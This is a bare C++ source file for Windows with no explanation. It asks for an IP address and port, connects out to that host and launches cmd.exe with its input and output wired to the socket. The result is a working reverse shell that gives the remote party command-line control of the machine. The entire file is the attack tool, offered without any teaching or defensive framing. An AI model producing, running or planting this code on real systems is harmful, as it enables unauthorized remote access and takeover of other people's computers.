#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdexcept>
#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 512;

int main()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) throw std::runtime_error("WSAStartup failed");

    std::string ip_addr, port_str;
    std::cout << "Enter IP address: "; std::cin >> ip_addr;
    std::cout << "Enter port number: "; std::cin >> port_str;
    int port = std::stoi(port_str);

    SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET) throw std::runtime_error("Socket creation failed");

    sockaddr_in shell_addr = {0};
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    InetPton(AF_INET, ip_addr.c_str(), &shell_addr.sin_addr);
    if (connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) throw std::runtime_error("Connection to the target server failed");

    char recv_buffer[BUFFER_SIZE] = {0};
    int bytes_received = recv(shell, recv_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received == SOCKET_ERROR) throw std::runtime_error("Error receiving data");

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) throw std::runtime_error("Failed to create process");

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(shell);
    WSACleanup();
    return 0;
}
